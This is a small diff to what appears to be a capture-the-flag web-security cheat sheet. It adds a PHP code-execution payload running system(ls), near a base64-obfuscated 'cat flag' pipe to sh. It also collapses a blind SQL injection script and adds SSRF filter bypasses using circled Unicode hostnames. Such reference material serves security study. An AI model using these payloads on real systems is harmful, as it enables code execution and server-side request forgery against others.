@@ -89,6 +89,8 @@ Table of Contents
 
 echo "{${phpinfo()}}";
 
+echo "${system(ls)}";
+
 echo Y2F0IGZsYWc= | base64 -d | sh
 // Y2F0IGZsYWc=   =>  cat  flag
 
@@ -1053,6 +1055,9 @@ pop graphic-context
     - `sqlite_version()`
     - sqlite無法使用`\'`跳脫單引號
 - Boolean Based: SECCON 2017 qual SqlSRF
+
+<details>
+    <summary><b>Click here to view script</b></summary>
 ```ruby
 # encoding: UTF-8
 
@@ -1090,7 +1095,7 @@ $ans = ''
 end
 
 ```
-
+</details>
 
 ## PostgreSQL
 
@@ -1669,6 +1674,11 @@ http://0x7f.1
 http://[::]
 
 ```
+
+## Bypass using Ⓐ Ⓑ Ⓒ Ⓓ
+
+- `http://ⓀⒶⒾⒷⓇⓄ.ⓉⓌ`
+- `http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ`
 
 ## 內網IP
 
